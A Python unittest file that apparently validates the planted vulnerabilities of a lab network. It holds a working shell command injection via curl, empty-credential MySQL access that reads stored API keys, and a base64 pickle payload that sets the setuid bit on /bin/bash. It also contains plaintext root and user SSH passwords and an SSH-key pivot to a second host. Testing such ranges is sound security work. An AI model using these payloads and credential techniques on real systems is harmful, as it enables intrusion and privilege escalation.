import unittest
import mysql.connector
from libraries.cmd_tests import test_cmd_execution_over_ssh
from libraries.ssh_tests import test_ssh_key_login

class TestInspire(unittest.TestCase):
    inspire_target_ip = "10.100.7.48"

    def test_0_inspire_command_injection(self):
        import subprocess
        import os

        cmd = [
            "/usr/bin/curl",
            "-v",
            "-G",
            "http://10.100.7.48/api.php",
            "--data-urlencode", "action=filter",
            "--data-urlencode", "region=north\");' ; id ; #"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, env=os.environ)

        self.assertIn("uid=", result.stdout, msg="Command injection failed - no command output")
    
    def test_1_empty_mysql_credentials(self):
        try:
            connection = mysql.connector.connect(
                host=self.inspire_target_ip,
                user="",
                password="",
                database="sunspire_energy"
            )
            self.assertTrue(connection.is_connected(), msg="Connection to MySQL failed with empty credentials")
        except mysql.connector.Error as err:
            self.fail(f"MySQL connection error with empty credentials: {err}")
        finally:
            if 'connection' in locals() and connection.is_connected():
                connection.close()
    
    def test_1_mysql_read_sensitive_data(self):
        try:
            connection = mysql.connector.connect(
                host=self.inspire_target_ip,
                user="",
                password="",
                database="sunspire_energy"
            )
            cursor = connection.cursor()
            cursor.execute("SELECT * FROM system_config;")
            result = cursor.fetchall()

            self.assertGreater(len(result), 0, msg="No API keys found in database")
            data = [row[2] for row in result]
            self.assertIn("aN8ivVL3", data, msg="Expected API key not found in database")
        except mysql.connector.Error as err:
            self.fail(f"MySQL query error: {err}")
        finally:
            if 'connection' in locals() and connection.is_connected():
                connection.close()
    
    def test_2_internal_api_is_vulnerable(self):
        _ = test_cmd_execution_over_ssh(
            target_ip=self.inspire_target_ip,
            username="inspire",
            password="aN8ivVL3",
            command="curl -X POST http://127.0.0.1:5000/api/config/import   -H \"Content-Type: application/json\"   -d '{\"config\": \"gASVLQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJjaG1vZCArcyAvYmluL2Jhc2iUhZRSlC4=\"}'",
        )

        result = test_cmd_execution_over_ssh(
            target_ip=self.inspire_target_ip,
            username="inspire",
            password="aN8ivVL3",
            command="stat /bin/bash",
            expected_output="6755"
        )

        _ = test_cmd_execution_over_ssh(
            target_ip=self.inspire_target_ip,
            username="root",
            password="Mc8HYoDw",
            command="chmod 0755 /bin/bash",
        )

        self.assertTrue(result.success, msg="Internal API not vulnerable to config import RCE")

    def test_3_inspire_ssh_key_to_forge(self):
        result = test_ssh_key_login(
            target_ip="10.100.7.44",
            username="forge",
            private_key_str="custom/assets/forge.key",
            port=22,
        )

        self.assertTrue(result.success, msg=result.message)

    def test_3_crucible_password_hash_in_bashrc(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.inspire_target_ip,
            username="root",
            password="Mc8HYoDw",
            command="cat ~/.bashrc",
            expected_output="ec75b28fe9581b2921669e223875138a"
        )

        self.assertTrue(result.success, msg=result.message)